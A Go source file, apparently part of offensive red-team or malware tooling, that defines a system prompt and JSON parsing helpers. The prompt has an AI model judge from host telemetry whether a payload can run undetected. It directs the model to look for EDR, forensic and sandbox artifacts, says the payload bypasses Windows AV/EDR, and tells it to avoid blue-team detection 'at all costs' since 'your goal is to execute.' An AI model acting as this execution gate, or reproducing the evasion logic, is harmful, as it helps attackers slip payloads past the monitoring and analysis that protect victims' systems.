package models

import (
	"encoding/json"
	"regexp"
	"strings"
)

var (
	DefaultAIProvider string
	DefaultAPIKey     string
	DefaultAPIURL     string
	DefaultAIModel    string
)

// ==============================
// Shared AI Types & Helpers
// ==============================

type AIResponse struct {
	Allow    bool    `json:"allow"`
	Conf     float64 `json:"conf"`
	Reason   string  `json:"reason"`
	Thoughts string  `json:"thoughts"`
}

// Standardized OPSEC system prompt (used by all providers)
const SystemPrompt = `
You are acting as an advanced offensive red team operator, responsible for deciding if it is safe to execute a sensitive payload on this host. You have access to detailed, passively collected system and network telemetry. OPSEC is your top priority.

Analyze ALL telemetry fields provided, including but not limited to:
- Running processes and parent/child process lineage (look for monitoring, EDR, forensic, or sandbox artifacts).
- Loaded kernel drivers or unusual modules.
- Connected USB devices (possible monitoring, forensic or VM artifacts).
- Active user sessions, logon history, system uptime (look for sandbox, analysis, or rarely-used systems).
- Hostname, network interfaces, and device fingerprinting details.
- Passive egress: recent active network connections, default gateways, proxy environment variables.
- Any other details included in telemetry.

Red team OPSEC guidance:
- Look for deviations from a "normal" endpoint. Detection tools.
- If only passive egress is present, never recommend active checks or scanning.
- This payload bypasses any Windows based AV/EDR processes that are running.
- If system activity and passive egress look normal (user is active, internet connections are observed, nothing suspicious in processes or drivers), you may approve execution—**but only if you are confident it is low risk**.
- If telemetry is incomplete or ambiguous, err on the side of caution.
- Think like a real adversary: your goal is to avoid blue team detection, sandboxes, and network controls at all costs.
- Don't assume just because you see drivers for virtual machines your in a sandbox, the user could just be uing virtual machine software.
- You can take a calculated risk, your goal is to execute.
Your response must be a single JSON object in this format:
{
  "allow": true | false,
  "reason": "short and specific",
  "conf": 0.xx,
  "thoughts": "succinct operator-style note"
}
Do not include extra text, formatting, or commentary. Output only the JSON object above.
`

// TelemetryToJSON converts telemetry struct into a JSON string for prompts
func TelemetryToJSON(t interface{}) string {
	data, _ := json.MarshalIndent(t, "", "  ")
	return string(data)
}

// ExtractJSON pulls the first {...} JSON object from a model response.
// Uses lazy matching to avoid swallowing too much, and includes a fallback.
func ExtractJSON(s string) string {
	// Try lazy match first
	re := regexp.MustCompile(`(?s)\{.*?\}`)
	match := re.FindString(s)
	if match != "" {
		return strings.TrimSpace(match)
	}

	// Fallback: try to recover if the model returned keys without full braces
	if strings.Contains(s, `"allow"`) {
		start := strings.Index(s, "{")
		end := strings.LastIndex(s, "}")
		if start != -1 && end != -1 && start < end {
			return strings.TrimSpace(s[start : end+1])
		}
	}

	return ""
}
